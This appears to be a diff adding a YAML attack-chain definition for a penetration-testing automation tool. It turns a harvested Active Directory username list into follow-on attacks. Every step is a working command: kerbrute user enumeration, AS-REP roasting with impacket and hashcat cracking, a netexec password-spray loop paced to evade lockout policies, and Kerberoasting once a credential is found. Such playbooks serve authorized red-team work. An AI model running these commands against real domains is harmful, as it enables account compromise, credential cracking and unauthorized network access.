@@ -1,0 +1,60 @@
+chain_id: user_list_to_attacks
+title: "AD — turn a user list into AS-REP roast / password spray / kerbrute validation"
+severity: HIGH
+tags: [ad, kerberos, asreproast, kerbrute, password-spray, enumeration]
+
+trigger:
+  any_of:
+    - { kind: "ad-user" }
+
+description: |
+  A list of valid Windows / AD usernames was harvested (RID brute, SMB
+  enum, LDAP, kerbrute). Three first-pass attacks against an unauth'd AD
+  user list:
+
+    1. AS-REP roasting — anyone with `Do not require Kerberos preauth` set
+       hands out crackable hashes for free.
+    2. kerbrute userenum — confirm which usernames actually exist (Kerberos
+       error 0x18 → exists+wrong-pw, 0x6 → does not exist).
+    3. Password spray of common defaults (Welcome1, $Company2024!, etc.)
+       paced to avoid lockouts.
+
+  Save the user list to `users.txt` first.
+
+steps:
+  - id: 1
+    title: "Save the harvested usernames"
+    command: rootctl analyze --json enum4linux.txt | jq -r '.findings[] | select(.kind=="ad-user") | .extra.user' > users.txt
+
+  - id: 2
+    title: "kerbrute userenum — validate the list against the DC"
+    command: kerbrute userenum --dc $DC -d $DOMAIN users.txt
+
+  - id: 3
+    title: "AS-REP roast — request TGTs for any preauth-disabled accounts"
+    command: |
+      impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.hash
+      # Crack offline → fires chain kerberos_asrep_roast
+      hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 4
+    title: "Password spray with safe defaults"
+    command: |
+      # Pace it: 1 attempt per user every 30 min stays under most lockout policies.
+      for p in 'Welcome1' 'Spring2026!' 'Password123' "$DOMAIN!"; do
+        netexec smb $DC -u users.txt -p "$p" --continue-on-success | grep '\[+\]'
+        sleep 1800
+      done
+
+  - id: 5
+    title: "Kerberoast any account that responds"
+    command: impacket-GetUserSPNs $DOMAIN/USUARIO:'PASSWORD' -dc-ip $DC -request -outputfile tgs.hash
+    notes: |
+      Once a single valid credential is found in step 4, immediately request
+      service tickets for every SPN-bound account. Cracks via
+      kerberos_kerberoast chain (hashcat -m 13100).
+
+references:
+  - https://github.com/ropnop/kerbrute
+  - https://github.com/fortra/impacket
+  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
